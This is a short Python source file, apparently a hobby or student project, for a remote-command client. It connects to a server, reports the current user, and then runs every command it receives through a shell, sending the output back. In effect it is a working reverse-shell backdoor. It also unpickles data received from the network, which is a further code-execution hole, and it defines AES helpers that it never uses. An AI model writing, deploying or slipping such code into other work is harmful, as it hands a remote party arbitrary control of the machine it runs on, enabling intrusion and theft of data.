import socket
import pickle
import subprocess
import time
import pdb
from Crypto.Cipher import AES

#||||||||||||||||||||||||||||||CLIENT||||||||||||||||||||||||||

#TODO
#   1.  At line 34, have the client execute whatever it receives and send it back to the server


socket = socket.socket()
HVA = '145.109.173.68'
l = 'localhost'
serverAddress = l, 1111


def encryptAES(message, key):
    obj = AES.new(key[0], AES.MODE_CBC, key[1])
    ciphertext = obj.encrypt(message)
    return ciphertext


def decryptAES(ciphertext, key):
    obj2 = AES.new(key[0], AES.MODE_CBC, key[1])
    message = obj2.decrypt(ciphertext)
    return message

#   --> Execute a command and return the result of it
def popenExecution(data):
    command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    return str(command.stdout.read() + command.stderr.read(), "utf-8")


#   --> Send a payload to the server
def send(socket, payload):
    try:
        socket.send(pickle.dumps(payload))
    except Exception as e:
        print(e)
        time.sleep(1)
        
#   --> simple receive function, expects a command, calls for a send right after
def receive(socket):
    try:
        message = pickle.loads(socket.recv(2048))
        send(socket, popenExecution(message))
        print(message)

    except Exception as e:
        print(e)

def main():
    
    socket.connect(serverAddress)
    #Standard command to identify who this machine is
    socket.send(pickle.dumps(popenExecution("who").split()[0])) 
    while True:
        receive(socket)
        time.sleep(1)


main()
